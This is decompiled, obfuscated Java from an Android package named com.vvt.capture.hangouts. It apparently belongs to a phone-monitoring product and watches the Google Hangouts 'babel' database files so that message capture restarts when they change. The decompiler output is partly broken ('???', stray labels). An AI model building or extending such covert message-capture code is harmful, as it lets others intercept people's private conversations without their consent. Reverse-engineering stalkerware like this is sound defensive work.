package com.vvt.capture.hangouts.a;

import android.os.SystemClock;
import com.vvt.base.capture.h;
import com.vvt.capture.hangouts.b.a.a;
import com.vvt.n.a.b.b;
import java.util.HashSet;
import java.util.Iterator;

class d
  implements a
{
  d(c paramc) {}
  
  public void a(int paramInt, String paramString)
  {
    Object localObject1 = "babel";
    boolean bool1 = paramString.contains((CharSequence)localObject1);
    Object localObject6;
    if (bool1)
    {
      localObject1 = "db-journal";
      bool1 = paramString.endsWith((String)localObject1);
      if (!bool1)
      {
        bool1 = c.b();
        if (bool1) {}
        localObject1 = b.b();
        ??? = b.a((String)localObject1);
        localObject1 = b.b((String)localObject1);
        localObject6 = c.a(this.a);
        if (localObject6 == null)
        {
          localObject6 = this.a;
          c.a((c)localObject6, (String)localObject1);
        }
        boolean bool2 = c.b();
        if (bool2) {}
        localObject6 = c.a(this.a);
        bool2 = ((String)localObject1).equals(localObject6);
        if (bool2) {
          break label209;
        }
        c.a(this.a, (String)localObject1);
        localObject1 = this.a;
        synchronized (c.b((c)localObject1))
        {
          localObject1 = this.a;
          localObject1 = c.b((c)localObject1);
          localObject6 = ((HashSet)localObject1).iterator();
          bool1 = ((Iterator)localObject6).hasNext();
          if (bool1)
          {
            localObject1 = ((Iterator)localObject6).next();
            localObject1 = (h)localObject1;
            ((h)localObject1).c();
          }
        }
      }
    }
    for (;;)
    {
      bool1 = c.b();
      if (bool1) {}
      return;
      label209:
      bool1 = ((String)???).equals(paramString);
      if (bool1)
      {
        long l = 2000L;
        SystemClock.sleep(l);
        Object localObject3 = this.a;
        synchronized (c.b((c)localObject3))
        {
          localObject3 = this.a;
          localObject3 = c.b((c)localObject3);
          localObject6 = ((HashSet)localObject3).iterator();
          bool1 = ((Iterator)localObject6).hasNext();
          if (bool1)
          {
            localObject3 = ((Iterator)localObject6).next();
            localObject3 = (h)localObject3;
            ((h)localObject3).a();
          }
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/hangouts/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */